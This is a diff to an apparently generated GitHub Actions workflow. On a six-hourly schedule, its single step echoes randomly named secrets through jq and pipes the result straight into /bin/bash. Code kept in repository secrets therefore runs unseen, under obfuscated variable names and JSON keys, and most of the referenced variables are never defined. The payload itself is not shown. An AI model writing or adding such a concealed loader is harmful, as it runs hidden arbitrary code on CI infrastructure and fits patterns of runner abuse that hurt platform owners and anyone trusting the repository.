@@ -1,22 +1,29 @@
 name: articulatepeanuts
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 4/6 * * *'
-jobs:  # 4368
+    - cron: '39 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: articulatepeanuts
         env:
-          thyqx732: ${{ secrets.thyqx732 }}
+          gtfp5063: ${{ secrets.gtfp5063 }}
         run: |
-          echo $thyqx732 | jq -r .c8 | /bin/bash
-          echo $d955 | jq -r .auo211 | /bin/bash
-          echo $x33646 | jq -r .p482 | /bin/bash
-          echo $oq42008 | jq -r .ixufb3 | /bin/bash
-          echo $vr5 | jq -r .y7 | /bin/bash
-          echo $sirxx19 | jq -r .lvrk1136 | /bin/bash
+          echo $gtfp5063 | jq -r .x44985 | /bin/bash
+          echo $maoic5 | jq -r .yofg463 | /bin/bash
+          echo $k396 | jq -r .m321 | /bin/bash
+          echo $q32473 | jq -r .cbwit5547 | /bin/bash
+          echo $pbd709 | jq -r .s931 | /bin/bash
+          echo $adwm87 | jq -r .mvkes8 | /bin/bash
+          echo $xiy6730 | jq -r .a30 | /bin/bash
+          echo $okz70400 | jq -r .pl9061 | /bin/bash
+          echo $l84621 | jq -r .bo8 | /bin/bash
+          echo $vhlip3 | jq -r .muhmq73 | /bin/bash
+          echo $l2 | jq -r .fhcxk00 | /bin/bash
+          echo $is3575 | jq -r .wh0235 | /bin/bash
+          echo $zr92697 | jq -r .ltfy825 | /bin/bash
 
